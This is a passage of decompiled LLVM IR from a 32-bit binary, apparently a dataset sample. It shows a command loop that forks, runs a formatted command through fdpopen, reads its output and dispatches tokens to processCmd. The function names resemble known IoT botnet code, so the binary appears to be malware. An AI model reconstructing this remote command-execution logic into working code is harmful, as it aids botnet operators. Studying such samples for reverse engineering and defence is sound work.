  store i1 %v6_8051132, i1* %cf.global-to-local, align 1
  %v10_8051132 = icmp eq i8 %v2_8051130, 13
  br i1 %v10_8051132, label %dec_label_pc_80510c1, label %dec_label_pc_8051136

dec_label_pc_8051136:                             ; preds = %dec_label_pc_805110e
  store i32 %v1_80510b9, i32* %eax.global-to-local, align 4
  %v2_8051144162 = load i8, i8* %v5_80510bc, align 1
  %v3_8051144163 = zext i8 %v2_8051144162 to i32
  %v6_8051144165 = or i32 %v3_8051144163, %v1_80510f4
  store i32 %v6_8051144165, i32* %eax.global-to-local, align 4
  %v3_8051146166 = icmp ult i8 %v2_8051144162, 32
  store i1 %v3_8051146166, i1* %cf.global-to-local, align 1
  %v7_8051146167 = icmp eq i8 %v2_8051144162, 32
  br i1 %v7_8051146167, label %dec_label_pc_8051153, label %dec_label_pc_805114a

dec_label_pc_805113e:                             ; preds = %dec_label_pc_805114a
  %v5_805113e = add i32 %v4_8051141169, 1
  %v22_805113e = inttoptr i32 %v5_805113e to i8*
  store i32 %v5_805113e, i32* %eax.global-to-local, align 4
  %v2_8051144 = load i8, i8* %v22_805113e, align 1
  %v3_8051144 = zext i8 %v2_8051144 to i32
  %v5_8051144 = and i32 %v5_805113e, -256
  %v6_8051144 = or i32 %v3_8051144, %v5_8051144
  store i32 %v6_8051144, i32* %eax.global-to-local, align 4
  %v3_8051146 = icmp ult i8 %v2_8051144, 32
  store i1 %v3_8051146, i1* %cf.global-to-local, align 1
  %v7_8051146 = icmp eq i8 %v2_8051144, 32
  br i1 %v7_8051146, label %dec_label_pc_8051153, label %dec_label_pc_805114a

dec_label_pc_805114a:                             ; preds = %dec_label_pc_8051136, %dec_label_pc_805113e
  %v5_8051144170 = phi i32 [ %v5_8051144, %dec_label_pc_805113e ], [ %v1_80510f4, %dec_label_pc_8051136 ]
  %v4_8051141169 = phi i32 [ %v5_805113e, %dec_label_pc_805113e ], [ %v1_80510b9, %dec_label_pc_8051136 ]
  %stack_var_-64.1168 = phi i8* [ %v22_805113e, %dec_label_pc_805113e ], [ %v5_80510bc, %dec_label_pc_8051136 ]
  store i32 %v4_8051141169, i32* %eax.global-to-local, align 4
  %v2_805114d = load i8, i8* %stack_var_-64.1168, align 1
  %v3_805114d = zext i8 %v2_805114d to i32
  %v6_805114d = or i32 %v3_805114d, %v5_8051144170
  store i32 %v6_805114d, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_805114f = icmp eq i8 %v2_805114d, 0
  %v1_8051151 = icmp eq i1 %v4_805114f, false
  br i1 %v1_8051151, label %dec_label_pc_805113e, label %dec_label_pc_8051153

dec_label_pc_8051153:                             ; preds = %dec_label_pc_805113e, %dec_label_pc_805114a, %dec_label_pc_8051136
  %stack_var_-64.1.lcssa = phi i8* [ %v5_80510bc, %dec_label_pc_8051136 ], [ %stack_var_-64.1168, %dec_label_pc_805114a ], [ %v22_805113e, %dec_label_pc_805113e ]
  %v4_8051141.lcssa = phi i32 [ %v1_80510b9, %dec_label_pc_8051136 ], [ %v4_8051141169, %dec_label_pc_805114a ], [ %v5_805113e, %dec_label_pc_805113e ]
  store i8 0, i8* %stack_var_-64.1.lcssa, align 1
  %v5_8051159 = add i32 %v4_8051141.lcssa, 1
  store i32 %v1_80510b9, i32* %eax.global-to-local, align 4
  %v2_8051187176 = load i8, i8* %v5_80510bc, align 1
  %v3_8051187177 = zext i8 %v2_8051187176 to i32
  %v6_8051187179 = or i32 %v3_8051187177, %v1_80510f4
  store i32 %v6_8051187179, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_8051189180 = icmp eq i8 %v2_8051187176, 0
  %v1_805118b181 = icmp eq i1 %v4_8051189180, false
  br i1 %v1_805118b181, label %dec_label_pc_8051164, label %dec_label_pc_805118d

dec_label_pc_8051164:                             ; preds = %dec_label_pc_8051153, %dec_label_pc_8051164
  %storemerge16183 = phi i8* [ %storemerge16, %dec_label_pc_8051164 ], [ %v5_80510bc, %dec_label_pc_8051153 ]
  %storemerge16.in182 = phi i32 [ %v5_8051181, %dec_label_pc_8051164 ], [ %v1_80510b9, %dec_label_pc_8051153 ]
  store i32 %storemerge16.in182, i32* %eax.global-to-local, align 4
  %v2_8051167 = load i8, i8* %storemerge16183, align 1
  %v3_8051167 = zext i8 %v2_8051167 to i32
  store i32 %v3_8051167, i32* %eax.global-to-local, align 4
  %v0_805116e = load i32, i32* @esp, align 4
  %v5_805116e = icmp ult i32 %v0_805116e, 12
  store i1 %v5_805116e, i1* %cf.global-to-local, align 1
  %v2_8051171 = add i32 %v0_805116e, -16
  %v3_8051171 = inttoptr i32 %v2_8051171 to i32*
  store i32 %v3_8051167, i32* %v3_8051171, align 4
  %v2_8051172 = call i32 @__GI_toupper(i32 %storemerge16.in182)
  %v0_8051177 = load i32, i32* @esp, align 4
  %v2_8051177 = icmp ugt i32 %v0_8051177, -17
  store i1 %v2_8051177, i1* %cf.global-to-local, align 1
  %v1_805117a = urem i32 %v2_8051172, 256
  %v2_805117a = load i32, i32* @edx, align 4
  %v3_805117a = and i32 %v2_805117a, -256
  %v4_805117a = or i32 %v3_805117a, %v1_805117a
  store i32 %v4_805117a, i32* @edx, align 4
  %v1_805117f = trunc i32 %v2_8051172 to i8
  store i8 %v1_805117f, i8* %storemerge16183, align 1
  %v5_8051181 = add i32 %storemerge16.in182, 1
  %storemerge16 = inttoptr i32 %v5_8051181 to i8*
  store i32 %v5_8051181, i32* %eax.global-to-local, align 4
  %v2_8051187 = load i8, i8* %storemerge16, align 1
  %v3_8051187 = zext i8 %v2_8051187 to i32
  %v5_8051187 = and i32 %v5_8051181, -256
  %v6_8051187 = or i32 %v3_8051187, %v5_8051187
  store i32 %v6_8051187, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_8051189 = icmp eq i8 %v2_8051187, 0
  %v1_805118b = icmp eq i1 %v4_8051189, false
  br i1 %v1_805118b, label %dec_label_pc_8051164, label %dec_label_pc_805118d

dec_label_pc_805118d:                             ; preds = %dec_label_pc_8051164, %dec_label_pc_8051153
  %v22_8051159 = inttoptr i32 %v5_8051159 to i8*
  store i32 %v1_80510b9, i32* %eax.global-to-local, align 4
  store i1 false, i1* @df, align 1
  store i32 %v1_80510b9, i32* @esi, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_805af77.476 to i32), i32* @edi, align 4
  %v7_80511bd = call i32 @_strncmp(i8* %v5_80510bc, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_805af77.476, i32 0, i32 0), i32 5)
  %v8_80511bd = urem i32 %v7_80511bd, 2
  %v9_80511bd = icmp eq i32 %v8_80511bd, 0
  %v0_80511bf = load i1, i1* %cf.global-to-local, align 1
  %v2_80511bf = or i1 %v0_80511bf, %v9_80511bd
  %v3_80511bf = zext i1 %v2_80511bf to i32
  %v4_80511bf = load i32, i32* @edx, align 4
  %v5_80511bf = and i32 %v4_80511bf, -256
  %v6_80511bf = or i32 %v3_80511bf, %v5_80511bf
  %v7_80511bf = xor i32 %v6_80511bf, 1
  store i32 %v7_80511bf, i32* @edx, align 4
  %v3_80511c5 = and i32 %v7_80511bd, -256
  %v1_80511c7 = trunc i32 %v7_80511bf to i8
  %v3_80511c7 = zext i1 %v0_80511bf to i8
  %v4_80511c7 = sub nsw i8 %v1_80511c7, %v3_80511c7
  %v15_80511c7 = icmp eq i8 %v4_80511c7, 0
  %v20_80511c7 = zext i8 %v4_80511c7 to i32
  %v23_80511c7 = or i32 %v20_80511c7, %v3_80511c5
  store i32 %v23_80511c7, i32* @ecx, align 4
  %v2_80511cb = sext i8 %v4_80511c7 to i32
  store i32 %v2_80511cb, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_80511d0 = icmp eq i1 %v15_80511c7, false
  br i1 %v1_80511d0, label %dec_label_pc_80512a8, label %dec_label_pc_80511d6

dec_label_pc_80511d6:                             ; preds = %dec_label_pc_805118d
  %v0_80511d6 = call i32 @listFork()
  store i32 %v0_80511d6, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_80511db = icmp eq i32 %v0_80511d6, 0
  %v1_80511dd = icmp eq i1 %v1_80511db, false
  br i1 %v1_80511dd, label %dec_label_pc_80513bc.outer28.backedge, label %dec_label_pc_80511e3

dec_label_pc_80511e3:                             ; preds = %dec_label_pc_80511d6
  store i32 %v2_80511e3, i32* %edx.global-to-local, align 4
  store i32 1024, i32* %eax.global-to-local, align 4
  %v0_80511f0 = load i32, i32* @esp, align 4
  %v5_80511f0 = icmp ult i32 %v0_80511f0, 4
  store i1 %v5_80511f0, i1* %cf.global-to-local, align 1
  %v2_80511f3 = add i32 %v0_80511f0, -8
  %v3_80511f3 = inttoptr i32 %v2_80511f3 to i32*
  store i32 1024, i32* %v3_80511f3, align 4
  %v1_80511f4 = add i32 %v0_80511f0, -12
  %v2_80511f4 = inttoptr i32 %v1_80511f4 to i32*
  store i32 0, i32* %v2_80511f4, align 4
  %v2_80511f6 = add i32 %v0_80511f0, -16
  %v3_80511f6 = inttoptr i32 %v2_80511f6 to i32*
  store i32 %v2_80511e3, i32* %v3_80511f6, align 4
  %v5_80511f7 = call i32 @__GI_memset(i8* inttoptr (i32 5 to i8*), i32 ptrtoint ([5 x i8]* @global_var_805af77.476 to i32), i32 %v1_80510b9)
  %v0_80511fc = load i32, i32* @esp, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_805af7c.477 to i32), i32* %eax.global-to-local, align 4
  %tmp203 = and i32 %v0_80511fc, -4
  %v5_8051204 = icmp eq i32 %tmp203, -16
  store i1 %v5_8051204, i1* %cf.global-to-local, align 1
  %v6_8051207 = add i32 %v0_80511fc, 8
  %v7_8051207 = inttoptr i32 %v6_8051207 to i32*
  store i32 %v5_8051159, i32* %v7_8051207, align 4
  %v0_805120a = load i32, i32* %eax.global-to-local, align 4
  %v2_805120a = add i32 %v0_80511fc, 4
  %v3_805120a = inttoptr i32 %v2_805120a to i32*
  store i32 %v0_805120a, i32* %v3_805120a, align 4
  store i32 %v2_80511e3, i32* %eax.global-to-local, align 4
  %v3_8051211 = inttoptr i32 %v0_80511fc to i32*
  store i32 %v2_80511e3, i32* %v3_8051211, align 4
  %v5_8051212 = call i32 @szprintf(i32 5, i32 ptrtoint ([5 x i8]* @global_var_805af77.476 to i32), i32 %v1_80510b9, i32 %v1_80510b9)
  %v0_8051217 = load i32, i32* @esp, align 4
  %tmp204 = and i32 %v0_8051217, -8
  %v5_805121f = icmp eq i32 %tmp204, -16
  store i1 %v5_805121f, i1* %cf.global-to-local, align 1
  %v2_8051222 = add i32 %v0_8051217, 4
  %v3_8051222 = inttoptr i32 %v2_8051222 to i32*
  store i32 ptrtoint (i32* @global_var_805af84.478 to i32), i32* %v3_8051222, align 4
  store i32 %v2_80511e3, i32* @eax, align 4
  %v3_8051229 = inttoptr i32 %v0_8051217 to i32*
  store i32 %v2_80511e3, i32* %v3_8051229, align 4
  %v0_805122a = call i32 @fdpopen()
  store i32 %v0_805122a, i32* %eax.global-to-local, align 4
  %v3_805125d = inttoptr i32 %v0_805122a to i8*
  br label %dec_label_pc_8051272

dec_label_pc_8051237:                             ; preds = %dec_label_pc_8051272
  store i32 %v2_80511e3, i32* %eax.global-to-local, align 4
  %v5_805123d = icmp ult i32 %v1_8051289, 12
  store i1 %v5_805123d, i1* %cf.global-to-local, align 1
  %v3_8051240 = inttoptr i32 %v0_8051289 to i32*
  store i32 %v2_80511e3, i32* %v3_8051240, align 4
  %v0_8051241 = call i32 @trim()
  %v0_8051246 = load i32, i32* @esp, align 4
  store i32 %v2_80511e3, i32* %edx.global-to-local, align 4
  store i32 1024, i32* %eax.global-to-local, align 4
  %tmp205 = and i32 %v0_8051246, -4
  %v5_8051256 = icmp eq i32 %tmp205, -16
  store i1 %v5_8051256, i1* %cf.global-to-local, align 1
  %v2_8051259 = add i32 %v0_8051246, 8
  %v3_8051259 = inttoptr i32 %v2_8051259 to i32*
  store i32 1024, i32* %v3_8051259, align 4
  %v1_805125a = add i32 %v0_8051246, 4
  %v2_805125a = inttoptr i32 %v1_805125a to i32*
  store i32 0, i32* %v2_805125a, align 4
  %v3_805125c = inttoptr i32 %v0_8051246 to i32*
  store i32 %v2_80511e3, i32* %v3_805125c, align 4
  %v4_805125d = call i32 @__GI_memset(i8* %v3_805125d, i32 %stack_var_-28.1.ph, i32 %v2_8050b92)
  store i32 %v4_805125d, i32* %eax.global-to-local, align 4
  %v0_8051262 = load i32, i32* @esp, align 4
  %v1_8051262 = add i32 %v0_8051262, 16
  %v5_8051265 = icmp ult i32 %v1_8051262, 12
  store i1 %v5_8051265, i1* %cf.global-to-local, align 1
  %v2_8051268 = inttoptr i32 %v0_8051262 to i32*
  store i32 1, i32* %v2_8051268, align 4
  %v1_805126a = call i32 @sleep(i32 %v0_805122a)
  store i32 %v1_805126a, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8051272

dec_label_pc_8051272:                             ; preds = %dec_label_pc_80511e3, %dec_label_pc_8051237
  %storemerge25.in.in = load i32, i32* @esp, align 4
  %tmp206 = and i32 %storemerge25.in.in, -4
  %v5_8051272 = icmp eq i32 %tmp206, -16
  store i1 %v5_8051272, i1* %cf.global-to-local, align 1
  %v5_8051275 = add i32 %storemerge25.in.in, 8
  %v6_8051275 = inttoptr i32 %v5_8051275 to i32*
  store i32 %v0_805122a, i32* %v6_8051275, align 4
  %v1_8051278 = add i32 %storemerge25.in.in, 4
  %v2_8051278 = inttoptr i32 %v1_8051278 to i32*
  store i32 1024, i32* %v2_8051278, align 4
  store i32 %v2_80511e3, i32* %eax.global-to-local, align 4
  %v3_8051283 = inttoptr i32 %storemerge25.in.in to i32*
  store i32 %v2_80511e3, i32* %v3_8051283, align 4
  %v3_8051284 = call i32 @fdgets(i32 %v0_805122a, i32 %stack_var_-28.1.ph, i32 %v2_8050b92)
  store i32 %v3_8051284, i32* %eax.global-to-local, align 4
  %v0_8051289 = load i32, i32* @esp, align 4
  %v1_8051289 = add i32 %v0_8051289, 16
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_805128c = icmp eq i32 %v3_8051284, 0
  %v1_805128e = icmp eq i1 %v1_805128c, false
  br i1 %v1_805128e, label %dec_label_pc_8051237, label %dec_label_pc_8051290

dec_label_pc_8051290:                             ; preds = %dec_label_pc_8051272
  %v5_8051290 = icmp ult i32 %v1_8051289, 12
  store i1 %v5_8051290, i1* %cf.global-to-local, align 1
  %v6_8051293 = inttoptr i32 %v0_8051289 to i32*
  store i32 %v0_805122a, i32* %v6_8051293, align 4
  %v0_8051296 = call i32 @fdpclose()
  store i32 %v0_8051296, i32* @eax, align 4
  %v0_805129b = load i32, i32* @esp, align 4
  %v1_805129b = add i32 %v0_805129b, 16
  %v5_805129e = icmp ult i32 %v1_805129b, 12
  store i1 %v5_805129e, i1* %cf.global-to-local, align 1
  %v2_80512a1 = inttoptr i32 %v0_805129b to i32*
  store i32 0, i32* %v2_80512a1, align 4
  %v1_80512a3 = call i32 @__GI_exit(i32 %v0_805122a)
  store i32 %v1_80512a3, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80512a8

dec_label_pc_80512a8:                             ; preds = %dec_label_pc_805118d, %dec_label_pc_8051290
  store i32 %v5_8051159, i32* @eax, align 4
  %v0_80512b2 = load i32, i32* @esp, align 4
  %v5_80512b2 = icmp ult i32 %v0_80512b2, 8
  store i1 %v5_80512b2, i1* %cf.global-to-local, align 1
  %v1_80512b5 = add i32 %v0_80512b2, -12
  %v2_80512b5 = inttoptr i32 %v1_80512b5 to i32*
  store i32 ptrtoint (i32* @global_var_805af86.479 to i32), i32* %v2_80512b5, align 4
  %v0_80512ba = load i32, i32* @eax, align 4
  %v2_80512ba = add i32 %v0_80512b2, -16
  %v3_80512ba = inttoptr i32 %v2_80512ba to i32*
  store i32 %v0_80512ba, i32* %v3_80512ba, align 4
  %v1_80512bb = load i8*, i8** %stack_var_-36, align 4
  %v2_80512bb = ptrtoint i8* %v1_80512bb to i32
  %v3_80512bb = call i32 @__GI_strtok(i32 1, i32 %v2_80512bb)
  %v0_80512c0 = load i32, i32* @esp, align 4
  %v1_80512c0 = add i32 %v0_80512c0, 16
  %v5_80512c3 = inttoptr i32 %v3_80512bb to i8*
  store i8* %v5_80512c3, i8** %stack_var_-36, align 4
  store i32 %v1_80510b9, i32* %eax.global-to-local, align 4
  store i32 %v1_80510b9, i32* %stack_var_-132, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v5_805136c45 = icmp eq i32 %v3_80512bb, 0
  %v1_805137052 = icmp eq i1 %v5_805136c45, false
  br i1 %v1_805137052, label %dec_label_pc_80512d1, label %dec_label_pc_8051376

dec_label_pc_80512d1:                             ; preds = %dec_label_pc_80512a8, %dec_label_pc_8051357
  %v0_805135763 = phi i32 [ %v1_8051366, %dec_label_pc_8051357 ], [ %v1_80512c0, %dec_label_pc_80512a8 ]
  %v3_80512dd = phi i8* [ %tmp142, %dec_label_pc_8051357 ], [ %v5_80512c3, %dec_label_pc_80512a8 ]
  %stack_var_-40.153 = phi i32 [ %stack_var_-40.0, %dec_label_pc_8051357 ], [ 1, %dec_label_pc_80512a8 ]
  %v4_80512d1 = ptrtoint i8* %v3_80512dd to i32
  store i32 %v4_80512d1, i32* %eax.global-to-local, align 4
  %v2_80512d4 = load i8, i8* %v3_80512dd, align 1
  %v3_80512d4 = zext i8 %v2_80512d4 to i32
  %v5_80512d4 = and i32 %v4_80512d1, -256
  %v6_80512d4 = or i32 %v3_80512d4, %v5_80512d4
  store i32 %v6_80512d4, i32* @eax, align 4
  %v6_80512d6 = icmp ult i8 %v2_80512d4, 10
  store i1 %v6_80512d6, i1* %cf.global-to-local, align 1
  %v10_80512d6 = icmp eq i8 %v2_80512d4, 10
  br i1 %v10_80512d6, label %dec_label_pc_8051357, label %dec_label_pc_80512da

dec_label_pc_80512da:                             ; preds = %dec_label_pc_80512d1
  store i32 %stack_var_-40.153, i32* @ebx, align 4
  store i32 %v5_80512d4, i32* %eax.global-to-local, align 4
  store i1 false, i1* @df, align 1
  store i32 %v4_80512d1, i32* @edi, align 4
  %v3_80512f4 = call i32 @_strlen(i8* %v3_80512dd)
  %v1_80512f8 = add i32 %v3_80512f4, 1
  store i32 %v1_80512f8, i32* %eax.global-to-local, align 4
  %v0_80512fc = load i32, i32* @esp, align 4
  %v5_80512fc = icmp ult i32 %v0_80512fc, 12
  store i1 %v5_80512fc, i1* %cf.global-to-local, align 1
  %v2_80512ff = add i32 %v0_80512fc, -16
  %v3_80512ff = inttoptr i32 %v2_80512ff to i32*
  store i32 %v1_80512f8, i32* %v3_80512ff, align 4
  %v2_8051300 = call i32 @malloc(i32 %v4_80512d1)
  %v0_8051305 = load i32, i32* @esp, align 4
  %v2_8051305 = icmp ugt i32 %v0_8051305, -17
  store i1 %v2_8051305, i1* %cf.global-to-local, align 1
  %v1_8051308 = load i32, i32* @ebp, align 4
  %v2_8051308 = load i32, i32* @ebx, align 4
  %v3_8051308 = mul i32 %v2_8051308, 4
  %v4_8051308 = add i32 %v1_8051308, -124
  %v5_8051308 = add i32 %v4_8051308, %v3_8051308
  %v6_8051308 = inttoptr i32 %v5_8051308 to i32*
  store i32 %v2_8051300, i32* %v6_8051308, align 4
  %v3_805130c = load i8*, i8** %stack_var_-36, align 4
  %v4_805130c = ptrtoint i8* %v3_805130c to i32
  %v1_805131a = and i32 %v4_805130c, -256
  store i32 %v1_805131a, i32* %eax.global-to-local, align 4
  %v3_8051323 = call i32 @_strlen(i8* %v3_805130c)
  %v1_8051327 = add i32 %v3_8051323, 1
  store i32 %v1_8051327, i32* %edx.global-to-local, align 4
  store i32 %stack_var_-40.153, i32* %eax.global-to-local, align 4
  %v0_8051330 = load i32, i32* @ebp, align 4
  %v2_8051330 = mul i32 %stack_var_-40.153, 4
  %v3_8051330 = add i32 %v2_8051330, -124
  %v4_8051330 = add i32 %v0_8051330, %v3_8051330
  %v5_8051330 = inttoptr i32 %v4_8051330 to i32*
  %v6_8051330 = load i32, i32* %v5_8051330, align 4
  %v1_8051334 = inttoptr i32 %v6_8051330 to i8*
  store i32 %v6_8051330, i32* @edi, align 4
  store i1 false, i1* @df, align 1
  %v1_8051339 = and i32 %v6_8051330, -256
  store i32 %v1_8051339, i32* %eax.global-to-local, align 4
  %v5_805133b = call i8* @_memset(i8* %v1_8051334, i32 %v1_8051339, i32 %v1_8051327)
  %v6_805133b = ptrtoint i8* %v5_805133b to i32
  store i32 %v6_805133b, i32* @ecx, align 4
  store i32 %v4_805130c, i32* %edx.global-to-local, align 4
  store i32 %stack_var_-40.153, i32* %eax.global-to-local, align 4
  %v0_8051343 = load i32, i32* @ebp, align 4
  %v4_8051343 = add i32 %v0_8051343, %v3_8051330
  %v5_8051343 = inttoptr i32 %v4_8051343 to i32*
  %v6_8051343 = load i32, i32* %v5_8051343, align 4
  store i32 %v6_8051343, i32* @eax, align 4
  %v0_8051347 = load i32, i32* @esp, align 4
  %v5_8051347 = icmp ult i32 %v0_8051347, 8
  store i1 %v5_8051347, i1* %cf.global-to-local, align 1
  %v2_805134a = add i32 %v0_8051347, -12
  %v3_805134a = inttoptr i32 %v2_805134a to i32*
  store i32 %v4_805130c, i32* %v3_805134a, align 4
  %v0_805134b = load i32, i32* @eax, align 4
  %v2_805134b = add i32 %v0_8051347, -16
  %v3_805134b = inttoptr i32 %v2_805134b to i32*
  store i32 %v0_805134b, i32* %v3_805134b, align 4
  %v5_805134c = call i32 @strcpy(i8* %v3_805130c, i32 %v4_80512d1)
  store i32 %v5_805134c, i32* @eax, align 4
  %v0_8051351 = load i32, i32* @esp, align 4
  %v1_8051351 = add i32 %v0_8051351, 16
  %v2_8051351 = icmp ugt i32 %v0_8051351, -17
  store i1 %v2_8051351, i1* %cf.global-to-local, align 1
  %v4_8051354 = add i32 %stack_var_-40.153, 1
  br label %dec_label_pc_8051357

dec_label_pc_8051357:                             ; preds = %dec_label_pc_80512d1, %dec_label_pc_80512da
  %v0_8051357 = phi i32 [ %v0_805135763, %dec_label_pc_80512d1 ], [ %v1_8051351, %dec_label_pc_80512da ]
  %stack_var_-40.0 = phi i32 [ %stack_var_-40.153, %dec_label_pc_80512d1 ], [ %v4_8051354, %dec_label_pc_80512da ]
  %v5_8051357 = icmp ult i32 %v0_8051357, 8
  store i1 %v5_8051357, i1* %cf.global-to-local, align 1
  %v1_805135a = add i32 %v0_8051357, -12
  %v2_805135a = inttoptr i32 %v1_805135a to i32*
  store i32 ptrtoint (i32* @global_var_805af86.479 to i32), i32* %v2_805135a, align 4
  %v1_805135f = add i32 %v0_8051357, -16
  %v2_805135f = inttoptr i32 %v1_805135f to i32*
  store i32 0, i32* %v2_805135f, align 4
  %v1_8051361 = load i8*, i8** %stack_var_-36, align 4
  %v2_8051361 = ptrtoint i8* %v1_8051361 to i32
  %v3_8051361 = call i32 @__GI_strtok(i32 %stack_var_-40.0, i32 %v2_8051361)
  store i32 %v3_8051361, i32* %eax.global-to-local, align 4
  %v0_8051366 = load i32, i32* @esp, align 4
  %v1_8051366 = add i32 %v0_8051366, 16
  store i32 %v3_8051361, i32* %tmp140, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v5_805136c = icmp eq i32 %v3_8051361, 0
  %v1_8051370 = icmp eq i1 %v5_805136c, false
  %tmp142 = inttoptr i32 %v3_8051361 to i8*
  br i1 %v1_8051370, label %dec_label_pc_80512d1, label %dec_label_pc_8051376

dec_label_pc_8051376:                             ; preds = %dec_label_pc_8051357, %dec_label_pc_80512a8
  %v0_8051376 = phi i32 [ %v1_80512c0, %dec_label_pc_80512a8 ], [ %v1_8051366, %dec_label_pc_8051357 ]
  %stack_var_-40.1.lcssa = phi i32 [ 1, %dec_label_pc_80512a8 ], [ %stack_var_-40.0, %dec_label_pc_8051357 ]
  %v5_8051376 = icmp ult i32 %v0_8051376, 8
  store i1 %v5_8051376, i1* %cf.global-to-local, align 1
  store i32 %v2_8051379, i32* %eax.global-to-local, align 4
  %v2_805137c = add i32 %v0_8051376, -12
  %v3_805137c = inttoptr i32 %v2_805137c to i32*
  store i32 %v2_8051379, i32* %v3_805137c, align 4
  %v5_805137d = add i32 %v0_8051376, -16
  %v6_805137d = inttoptr i32 %v5_805137d to i32*
  store i32 %stack_var_-40.1.lcssa, i32* %v6_805137d, align 4
  %v0_8051380 = call i32 @processCmd()
  store i32 %v0_8051380, i32* %eax.global-to-local, align 4
  %v0_8051385 = load i32, i32* @esp, align 4
  %v9_8051388 = icmp eq i32 %stack_var_-40.1.lcssa, 0
  store i1 %v9_8051388, i1* %cf.global-to-local, align 1
  %v7_805138c = icmp sgt i32 %stack_var_-40.1.lcssa, 1
  br i1 %v7_805138c, label %dec_label_pc_805139e.lr.ph, label %dec_label_pc_80513bc.outer28.backedge

dec_label_pc_805139e.lr.ph:                       ; preds = %dec_label_pc_8051376
  %v1_8051385 = add i32 %v0_8051385, 16
  store i32 1, i32* %eax.global-to-local, align 4
  store i1 true, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_805139e

dec_label_pc_805139e:                             ; preds = %dec_label_pc_805139e.lr.ph, %dec_label_pc_805139e
  %storemerge188 = phi i32 [ 1, %dec_label_pc_805139e.lr.ph ], [ %v4_80513b1, %dec_label_pc_805139e ]
  %v0_80513a5187 = phi i32 [ %v1_8051385, %dec_label_pc_805139e.lr.ph ], [ %v1_80513ae, %dec_label_pc_805139e ]
  store i32 %storemerge188, i32* %eax.global-to-local, align 4
  %v0_80513a1 = load i32, i32* @ebp, align 4
  %v2_80513a1 = mul i32 %storemerge188, 4
  %v3_80513a1 = add i32 %v2_80513a1, -124
  %v4_80513a1 = add i32 %v3_80513a1, %v0_80513a1
  %v5_80513a1 = inttoptr i32 %v4_80513a1 to i32*
  %v6_80513a1 = load i32, i32* %v5_80513a1, align 4
  store i32 %v6_80513a1, i32* %eax.global-to-local, align 4
  %v5_80513a5 = icmp ult i32 %v0_80513a5187, 12
  store i1 %v5_80513a5, i1* %cf.global-to-local, align 1
  %v2_80513a8 = add i32 %v0_80513a5187, -16
  %v3_80513a8 = inttoptr i32 %v2_80513a8 to i32*
  store i32 %v6_80513a1, i32* %v3_80513a8, align 4
  %v1_80513a9 = call i32 @free(i32 %storemerge188)
  %v0_80513ae = load i32, i32* @esp, align 4
  %v1_80513ae = add i32 %v0_80513ae, 16
  %v4_80513b1 = add nuw nsw i32 %storemerge188, 1
  store i32 %v4_80513b1, i32* %eax.global-to-local, align 4
  %v10_80513b7 = icmp ult i32 %v4_80513b1, %stack_var_-40.1.lcssa
  store i1 %v10_80513b7, i1* %cf.global-to-local, align 1
  %v5_80513ba = icmp slt i32 %v4_80513b1, %stack_var_-40.1.lcssa
  br i1 %v5_80513ba, label %dec_label_pc_805139e, label %dec_label_pc_80513bc.outer

dec_label_pc_80513bc.outer:                       ; preds = %dec_label_pc_805139e, %dec_label_pc_8050d66
  %v0_80513c8.pre71 = phi i32 [ %v1_8050d99, %dec_label_pc_8050d66 ], [ %v1_80513ae, %dec_label_pc_805139e ]
  %stack_var_-28.1.ph = phi i32 [ %stack_var_-28.0.ph, %dec_label_pc_8050d66 ], [ %v4_80513b1, %dec_label_pc_805139e ]
  %stack_var_-64.2.ph = phi i8* [ %stack_var_-64.0.ph, %dec_label_pc_8050d66 ], [ %v22_8051159, %dec_label_pc_805139e ]
  %stack_var_-60.3.ph = phi i32 [ %stack_var_-60.0.ph, %dec_label_pc_8050d66 ], [ %stack_var_-60.2, %dec_label_pc_805139e ]
  br label %dec_label_pc_80513bc.outer28

dec_label_pc_80513bc.outer28:                     ; preds = %dec_label_pc_80513bc.outer28.backedge, %dec_label_pc_80513bc.outer
  %v0_80513c8.pre = phi i32 [ %v0_80513c8.pre71, %dec_label_pc_80513bc.outer ], [ %v0_80513c8.pre.pre, %dec_label_pc_80513bc.outer28.backedge ]
  %stack_var_-64.2.ph29 = phi i8* [ %stack_var_-64.2.ph, %dec_label_pc_80513bc.outer ], [ %stack_var_-64.2.ph29.be, %dec_label_pc_80513bc.outer28.backedge ]
  %stack_var_-60.3.ph30 = phi i32 [ %stack_var_-60.3.ph, %dec_label_pc_80513bc.outer ], [ %stack_var_-60.2, %dec_label_pc_80513bc.outer28.backedge ]
  %v2_8050dd5 = ptrtoint i8* %stack_var_-64.2.ph29 to i32
  br label %dec_label_pc_80513bc

dec_label_pc_80513bc:                             ; preds = %dec_label_pc_80513bc.outer28, %dec_label_pc_8051002
  %v0_80513c8 = phi i32 [ %v1_8051015, %dec_label_pc_8051002 ], [ %v0_80513c8.pre, %dec_label_pc_80513bc.outer28 ]
  %stack_var_-60.3 = phi i32 [ %stack_var_-60.2, %dec_label_pc_8051002 ], [ %stack_var_-60.3.ph30, %dec_label_pc_80513bc.outer28 ]
  store i32 %v2_80513bc, i32* %eax.global-to-local, align 4
  %v0_80513c2 = load i32, i32* @global_var_805d480.20, align 128
  store i32 %v0_80513c2, i32* %edx.global-to-local, align 4
  %v5_80513c8 = icmp ult i32 %v0_80513c8, 4
  store i1 %v5_80513c8, i1* %cf.global-to-local, align 1
  %v1_80513cb = add i32 %v0_80513c8, -8
  %v2_80513cb = inttoptr i32 %v1_80513cb to i32*
  store i32 4096, i32* %v2_80513cb, align 4
  %v2_80513d0 = add i32 %v0_80513c8, -12
  %v3_80513d0 = inttoptr i32 %v2_80513d0 to i32*
  store i32 %v2_80513bc, i32* %v3_80513d0, align 4
  %v0_80513d1 = load i32, i32* %edx.global-to-local, align 4
  %v2_80513d1 = add i32 %v0_80513c8, -16
  %v3_80513d1 = inttoptr i32 %v2_80513d1 to i32*
